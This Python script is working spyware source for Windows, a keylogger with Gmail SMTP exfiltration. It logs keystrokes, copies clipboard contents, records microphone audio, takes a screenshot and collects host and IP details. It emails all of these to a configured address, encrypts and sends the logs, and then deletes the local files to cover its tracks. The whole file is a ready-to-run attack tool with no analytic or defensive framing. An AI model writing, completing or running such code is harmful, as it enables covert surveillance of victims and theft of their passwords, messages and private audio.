# Libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from PIL import ImageGrab

# ---------------- Settings ----------------
keys_information = "key_log.txt"
system_information = "syseminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

microphone_time = 10
time_iteration = 15
number_of_iteration_end = 3

email_address = "your_mail@gmail.com"
password = "your password"   # app password

toaddr = "your_mail@gmail.com"
key = "generated key"

file_path = "C:\\Users\\IMRAN\\OneDrive\\Documents\\Files\\Keylogger"
extend = "\\"
file_merge = file_path + extend

with open(file_path + extend + keys_information, "a") as f:
    f.write("--- Keylogger Started ---\n")

# ---------------- Email Function ----------------
def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"

    body = "Body_of_the_mail"
    msg.attach(MIMEText(body, 'plain'))

    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', f'attachment; filename={filename}')
    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()

# ---------------- System Info ----------------
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + "\n")
        except Exception:
            f.write("Couldn't get Public IP Address\n")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

computer_information()

# ---------------- Clipboard ----------------
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data: \n" + pasted_data + "\n")
        except:
            f.write("Clipboard could not be copied\n")

copy_clipboard()

# ---------------- Microphone ----------------
def microphone():
    fs = 44100
    seconds = microphone_time
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=1)
    sd.wait()
    write(file_path + extend + audio_information, fs, myrecording)

microphone()

# ---------------- Screenshot ----------------
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

# Take screenshot ONCE at the start
screenshot()
send_email("screenshot.png", file_path + extend + screenshot_information, toaddr)

# ---------------- Keylogger ----------------
number_of_iteration = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

while number_of_iteration < number_of_iteration_end:
    count = 0
    keys = []

    def on_press(key):
        global keys, count, currentTime
        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if "space" in k:
                    f.write('\n')
                elif "Key" not in k:
                    f.write(k)

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    
    copy_clipboard()

    send_email("key_log.txt", file_path + extend + keys_information, toaddr)
    
    number_of_iteration += 1
    currentTime = time.time()
    stoppingTime = time.time() + time_iteration

# ---------------- Encrypt Files ----------------
files_to_encrypt = [
    file_merge + system_information,
    file_merge + clipboard_information,
    file_merge + keys_information
]
encrypted_files_name = [
    file_merge + system_information_e,
    file_merge + clipboard_information_e,
    file_merge + keys_information_e
]

for i, encrypting_files in enumerate(files_to_encrypt):
    with open(encrypting_files, 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_files_name[i], 'wb') as f:
        f.write(encrypted)

    filename = os.path.basename(encrypted_files_name[i])
    send_email(filename, encrypted_files_name[i], toaddr)

# ---------------- Cleanup ----------------
time.sleep(120)

delete_files = [
    system_information,
    clipboard_information,
    keys_information,
    screenshot_information,
    audio_information
]
for file in delete_files:
    try:
        os.remove(file_merge + file)
    except:
        pass
